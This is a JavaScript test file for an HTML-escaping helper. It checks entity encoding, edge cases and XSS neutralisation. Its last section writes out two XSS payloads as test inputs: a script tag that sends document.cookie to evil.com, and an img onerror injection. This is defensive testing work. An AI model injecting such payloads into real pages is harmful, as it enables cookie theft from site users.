import assert from "node:assert/strict";
import test from "node:test";

import { escapeHtml } from "../lib/ui-routes.js";

// ─── Basic escaping ─────────────────────────────────────────────────────────

test("escapes < and > to HTML entities", () => {
  assert.equal(escapeHtml("<script>alert('xss')</script>"), "&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;");
});

test("escapes & to &amp;", () => {
  assert.equal(escapeHtml("Tom & Jerry"), "Tom &amp; Jerry");
});

test("escapes double quotes to &quot;", () => {
  assert.equal(escapeHtml('She said "hello"'), "She said &quot;hello&quot;");
});

test("escapes single quotes to &#39;", () => {
  assert.equal(escapeHtml("O'Brien"), "O&#39;Brien");
});

// ─── All five characters in one string ──────────────────────────────────────

test("escapes all five HTML-significant characters together", () => {
  const input = `<div class="test" data-name='a&b'>`;
  const expected = `&lt;div class=&quot;test&quot; data-name=&#39;a&amp;b&#39;&gt;`;
  assert.equal(escapeHtml(input), expected);
});

// ─── No double-encoding ────────────────────────────────────────────────────

test("does not double-encode already-safe static strings", () => {
  assert.equal(escapeHtml("Missing OAuth callback state or code."), "Missing OAuth callback state or code.");
});

test("does not double-encode an already-encoded ampersand entity", () => {
  // If input contains &amp; it should become &amp;amp; — this is correct
  // behavior since the function encodes raw input, not previously-encoded HTML.
  // However, static strings passed in (like error messages) do NOT contain
  // HTML entities, so there is no double-encoding issue in practice.
  assert.equal(escapeHtml("&amp;"), "&amp;amp;");
});

// ─── Legitimate special characters ─────────────────────────────────────────

test("encodes legitimate special characters in account names", () => {
  assert.equal(escapeHtml("O'Brien & Associates"), "O&#39;Brien &amp; Associates");
});

// ─── Edge cases ─────────────────────────────────────────────────────────────

test("returns empty string for empty input", () => {
  assert.equal(escapeHtml(""), "");
});

test("returns plain text unchanged", () => {
  assert.equal(escapeHtml("Hello world 123"), "Hello world 123");
});

test("handles string with only special characters", () => {
  assert.equal(escapeHtml("<>&\"'"), "&lt;&gt;&amp;&quot;&#39;");
});

// ─── XSS payloads ──────────────────────────────────────────────────────────

test("neutralizes script injection via error_description", () => {
  const payload = '<script>document.location="http://evil.com/?c="+document.cookie</script>';
  const result = escapeHtml(payload);
  assert.ok(!result.includes("<script>"), "result must not contain raw <script> tag");
  assert.ok(!result.includes("</script>"), "result must not contain raw </script> tag");
  assert.ok(result.includes("&lt;script&gt;"));
});

test("neutralizes img onerror XSS payload", () => {
  const payload = '<img onerror=alert(1) src="x">';
  const result = escapeHtml(payload);
  assert.ok(!result.includes("<img"), "result must not contain raw <img tag");
  assert.ok(result.includes("&lt;img"));
});
